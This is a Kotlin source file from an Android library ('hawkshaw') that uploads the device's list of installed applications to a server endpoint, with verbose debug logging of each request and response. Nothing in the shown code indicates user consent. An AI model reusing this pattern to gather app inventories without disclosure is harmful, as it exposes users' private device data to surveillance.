package com.hawkshaw.library.datalayer.network.service

import com.hawkshaw.library.datalayer.models.PushInstalledAppListRequest
import com.hawkshaw.library.datalayer.models.PushInstalledAppListResponse
import com.hawkshaw.library.datalayer.network.twirp.ApiResponse
import com.hawkshaw.library.datalayer.network.twirp.apiCall
import android.util.Log // Added for logging

/**
 * Implementation of MiscService
 */
class MiscServiceImpl : MiscService {
    private companion object { // Companion object for TAG
        private const val TAG = "MiscServiceImplLogs"
    }

    init {
        Log.d(TAG, "[DEBUG] MiscServiceImpl instance created.")
    }
    
    /**
     * Push installed application list to the server
     * 
     * @param request The installed application data to push
     * @return The response from the server
     */
    override suspend fun pushInstalledAppList(request: PushInstalledAppListRequest): ApiResponse<PushInstalledAppListResponse> {
        Log.d(TAG, "[DEBUG] pushInstalledAppList called. Request: $request")
        val endpoint = "misc.Misc/PushInstalledAppList"
        // Corrected line 30: Ensure the entire message is a single string template
        Log.d(TAG, "[DEBUG] pushInstalledAppList: Calling apiCall with endpoint: \"$endpoint\", req: $request")
        // Explicit type arguments are already correctly used in the original snippet
        val response = apiCall<PushInstalledAppListRequest, PushInstalledAppListResponse>(
            endpoint = endpoint,
            req = request
        )
        Log.d(TAG, "[DEBUG] pushInstalledAppList: apiCall returned. Response: $response")
        return response
    }
}
